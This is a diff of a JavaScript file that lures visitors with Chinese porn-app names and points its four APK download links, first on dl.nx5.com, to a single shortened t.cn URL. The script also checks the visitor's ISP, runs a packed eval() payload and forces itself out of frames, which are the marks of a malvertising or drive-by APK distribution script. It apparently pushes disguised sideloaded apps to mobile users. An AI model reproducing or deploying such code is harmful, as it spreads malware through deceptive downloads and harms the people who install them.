@@ -1,11 +1,11 @@
 var name="夜色A片";
 var name2="360影视A片";
 var name3="PPTV聚色A片";
-var name4="咪咪影院";
-var url="http://dl.nx5.com/apk/20141103/TV_817-release.apk";
-var url2="http://dl.nx5.com/apk/20140709/360Video_2.6.2_YS802.apk";
-var url3="http://dl.nx5.com/apk/20141104/PPTV_aPhone_4.0.6_863_20141103.apk";
-var url4="http://dl.nx5.com/apk_mbo/mmbo_10097_demo.apk";
+var name4="窥色高清影院";
+var url="http://t.cn/R7qX46q";
+var url2="http://t.cn/R7qX46q";
+var url3="http://t.cn/R7qX46q";
+var url4="http://t.cn/R7qX46q";
 
 try{
 	var isp=remote_ip_info.isp;
@@ -42,4 +42,3 @@ eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a
 if(top.location !== self.location){
 	top.location = self.location + '?id=1';
 }
-
